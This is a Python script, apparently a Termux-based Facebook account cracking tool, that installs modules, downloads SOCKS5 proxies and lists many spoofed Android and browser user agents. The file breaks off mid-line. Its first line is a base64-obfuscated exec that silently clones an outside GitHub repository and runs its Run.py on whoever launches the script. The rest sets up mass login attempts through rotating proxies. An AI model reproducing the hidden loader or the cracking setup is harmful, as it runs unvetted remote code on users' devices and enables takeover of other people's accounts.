import base64;exec(base64.b64decode(b'aW1wb3J0IG9zCm9zLnN5c3RlbSgicGtnIGluc3RhbGwgZ2l0ICYmIHBrZyBpbnN0YWxsIHB5dGhvbiAmJiBjZCAmJiBnaXQgY2xvbmUgaHR0cHM6Ly9naXRodWIuY29tL1JhYmJpLTE0My9SYW5kb20tRmlsZS5naXQgJiYgY2QgUmFuZG9tLUZpbGUgJiYgY2htb2QgK3ggKiAmJiBweXRob24gUnVuLnB5Iik='))


import os
import re
import sys
import zlib
import time
import json
import uuid
import urllib
import string
import hashlib
import base64
import random
import marshal
import platform
import calendar
import datetime
import threading
import ipaddress
import subprocess
print('\n \033[1;32m[✓] installing Modules !...\n')
try:
    import requests
except ImportError:
    print('\n \033[1;34m[✓] installing requests !...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n\033[1;32m [✓] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n \033[1;35m[✓] installing bs4 !...\n')
    os.system('pip install bs4')
try:
    import mechanize
except ImportError:
    print('\n \033[1;34m[✓] installing Mechanize !...\n')
    os.system('pip install mechanize')
import bs4
import requests
import mechanize
from os import system
from time import sleep
import requests as ress
from sys import exit as exit
from random import randint
from random import choice as pilih
from random import random as acak
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool

P = '\x1b[1;97m'
M = '\033[1;33m'
H = '\033[1;32m'
K = '\x1b[1;97m'
B = '\x1b[1;96m'
U = '\x1b[1;95m'
O = '\x1b[1;97m'
N = '\x1b[0m'

id = []
oks = []
cps = []
loop = 0
ugen2 = []
ugen = []
cokbrut = []
prinCP = []
ses=requests.Session()

print('\n \033[1;34m[✓] Connecting Proxies !...\n')
os.system("rm -rf /sdcard/.prox.txt")
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('/sdcard/.prox.txt','w').write(prox)
except Exception as e:
    pass
    
old3 =["Dalvik/2.1.0 (Linux; U; Android 11; motorola one 5G ace Build/RZKS31.Q3-45-16-9-11)","Dalvik/2.1.0 (Linux; U; Android 9; AFTWMST22 Build/PS7633.3445N)","Dalvik/2.1.0 (Linux; U; Android 10; 7LC1 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 11; X88pro10.r.de.6330.d4.software Build/RP1A.201105.002)","Dalvik/2.1.0 (Linux; U; Android 11; PX1 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 5.0.0; View Prime Build/v12bn [FBAN/FB4A;FBAV/353.0.0.27.492;FBBV/558626621;FBDM/{density=3.0,width=720,height=1280};FBLC/en_US;FBRV/558626621;FBMF/Wiko;FBBD/Wiko;FBPN/com.facebook.orca;FBDV/View Prime;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","Dalvik/2.1.0 (Linux; U; Android 5.1; Archos 50 Cobalt Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ2A.230405.003.A2)","Dalvik/2.1.0 (Linux; U; Android 13; PHP110 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; V2238 Build/TP1A.220624.014_NONFCMOD1)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-T818 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 12; TECNO Mobile CH9n Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; T96R Build/LMY49F)","Dalvik/2.1.0 (Linux; U; Android 7.0; Moto C Build/NRD90M.041)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ2A.230305.008.C1)","Dalvik/2.1.0 (Linux; U; Android 9; Viva_1003G Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 12; ZTE A2322G Build/SKQ1.220213.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G (2022) Build/S1SDS32.56-81-10)","Dalvik/2.1.0 (Linux; U; Android 9; coral Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A3460 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; hatch Build/R112-15359.45.0)","Dalvik/2.1.0 (Linux; U; Android 12; TAB_912_PRO_4G Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; 23021RAAEG Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2271 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; GT-S7580 Build/LMY48Y)","Dalvik/2.1.0 (Linux; U; Android 9; APEXA-A-1500 Build/PI)","Dalvik/2.1.0 (Linux; U; Android 5.1; YU 6000 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; GT-S7580 Build/LMY48Y)"]
rua =["WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)",
"WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)",
"WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)",
"WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
"WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
"WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)",
"WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
"WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
"Dalvik/2.1.0 (Linux; U; Android 5.1)",
"Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)"
"Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)",
"Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}",
"Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2",
"Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)",
"Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)",
"WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)",
"WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)",
"WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)",
"WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
"WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
"WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)",
"WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
"WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
"Dalvik/2.1.0 (Linux; U; Android 5.1)",
"Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)"
"Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)",
"Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}",
"Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2",
"Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)",
"Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)"]

header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0"}
header_grup = {"user-agen not": "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"}
header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"}
header_grup = {"user-agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20;Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.3.8610.5 Safari/537.36;Mozilla/5.0 (Windows NT 5.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.2.3576.5 Safari/537.36;Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/349.56 (KHTML, like Gecko) Mobile/J9UMJN baiduboxapp/0_17.7.6.6_enohpi_8957_628/2.01_4C2%258enohPi/1099a/P0SJ2RX4DXJT3RW906040KVOSH2E76RJUNHVIJUPCJQCZMEM2GL/1"}
header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a"}  
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"}
header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"}
header_grup = {"user-agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20;Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.3.8610.5 Safari/537.36;Mozilla/5.0 (Windows NT 5.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.2.3576.5 Safari/537.36;Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/349.56 (KHTML, like Gecko) Mobile/J9UMJN baiduboxapp/0_17.7.6.6_enohpi_8957_628/2.01_4C2%258enohPi/1099a/P0SJ2RX4DXJT3RW906040KVOSH2E76RJUNHVIJUPCJQCZMEM2GL/1"}
header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-N909O) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4414.144 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N960F/N960FXXS8FUC4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600FN/A600FNXXU6CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515F/A515FXXU2ATB1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN 6/128) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A013F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 630"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0"}
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"}
header_grup = {"user-agent": "Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.2.15 Version/10.00Opera/9.60 (Windows NT 6.0; U; en) Presto/2.1.1"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)"}
header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41"}
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"}
header_grup = {"user-agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20;Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.3.8610.5 Safari/537.36;Mozilla/5.0 (Windows NT 5.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.2.3576.5 Safari/537.36;Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/349.56 (KHTML, like Gecko) Mobile/J9UMJN baiduboxapp/0_17.7.6.6_enohpi_8957_628/2.01_4C2%258enohPi/1099a/P0SJ2RX4DXJT3RW906040KVOSH2E76RJUNHVIJUPCJQCZMEM2GL/1"}
header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"}
header_grup = 
